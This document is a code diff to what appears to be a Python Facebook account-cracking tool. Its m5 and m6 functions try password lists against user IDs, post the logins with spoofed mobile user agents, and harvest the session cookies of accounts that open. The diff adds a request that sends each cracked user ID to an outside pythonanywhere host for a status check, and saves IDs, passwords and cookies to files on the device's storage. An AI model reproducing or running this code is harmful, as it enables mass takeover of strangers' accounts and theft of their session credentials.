@@ -1129,17 +1129,17 @@ ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {device}) [FBAN/Messenge
 
 
 
-def m5(idf,pw):
+def m5(idf,pwv):
  global loop
  global ok
  global agents
  animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
  sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M5{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
  try:
-  for ps in pw:
+  for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://free.facebook.com').text
+   free_fb = session.get(f'https://m.facebook.com').text
    log_data = {
     "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1150,7 +1150,7 @@ def m5(idf,pw):
    "email":idf,
    "pass":ps,
    "login":"Log In"}
-   header_freefb = {'authority':'web.facebook.com',
+   header_freefb = {'authority':'m.facebook.com',
             'method': 'POST',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -1166,40 +1166,49 @@ def m5(idf,pw):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+   lo = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    print('\r\033[1;32m [KING-OK] '+user+'|'+ps) #+'--'+coki)
-    if 'y' in cokix:
-     print(f'\r{gen}{H}'+coki)
-    ok+=1 
-    open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
-    ok.append(user)
-    break
+    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+    reqx = requests.get(url).text
+    if 'live' in reqx:
+            print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            ok+=1 
+            break
+    if 'lock' in reqx:
+            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            ok+=1 
+            break
    elif 'checkpoint' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     coki1 = coki.split("1000")[1]
     uid = "1000"+coki1[0:11]
     if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
-    open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
-    cp.append(idf)
+     print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{ps}{xxx}')
+    open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
+    cp.append(uid)
    else:
     continue
   loop+=1
   
  except:
   pass 
-def m6(idf,pw):
+
+
+def m6(idf,pwv):
  global loop
  global ok
  global agents
  animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
  sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M6{P}] ({B}%s{P}){U}+{H}OK{P}(%s{P})'%(loop,ok)),
  try:
-  for ps in pw:
+  for ps in pwv:
    session = requests.Session()
             #animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
             #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
@@ -1233,7 +1242,7 @@ def m6(idf,pw):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+   lo = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1241,15 +1250,15 @@ def m6(idf,pw):
     url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
     reqx = requests.get(url).text
     if 'live' in reqx:
-            print(f'\r\r{G}[ATOM-OK]: {user} | {ps}')
+            print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOMb-M6-live-OK','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
     if 'lock' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOMb-M6-live-OK','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
    elif 'checkpoint' in log_cookies:
